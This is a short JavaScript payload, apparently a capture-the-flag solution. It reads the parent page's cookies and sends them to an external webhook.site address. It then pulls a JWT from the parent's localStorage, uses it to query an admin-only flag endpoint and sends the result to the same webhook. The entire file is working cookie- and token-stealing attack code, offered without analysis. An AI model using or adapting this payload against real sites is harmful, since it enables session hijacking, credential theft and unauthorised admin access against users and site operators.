(async () => {
  const leak = encodeURIComponent(parent.document.cookie || '<no_cookie>');

  // 🚩 NQ 2 flag arrives here
  await fetch('https://webhook.site/c226154a-75c4-445f-8f22-a77d01ef2dea?c=' + leak);

  // ---- NQ 3 bonus ----
  const jwt = parent.localStorage.token;
  if (jwt) {
    // grab the admin‑only flag endpoint
    const r = await fetch('https://api.' + location.host + '/admin/flag', {
      headers: { Authorization: 'Bearer ' + jwt }
    }).catch(() => {});
    if (r && r.ok) {
      const { flag } = await r.json();
      await fetch('https://webhook.site/c226154a-75c4-445f-8f22-a77d01ef2dea?flag=' + encodeURIComponent(flag));
    }
  }
})();
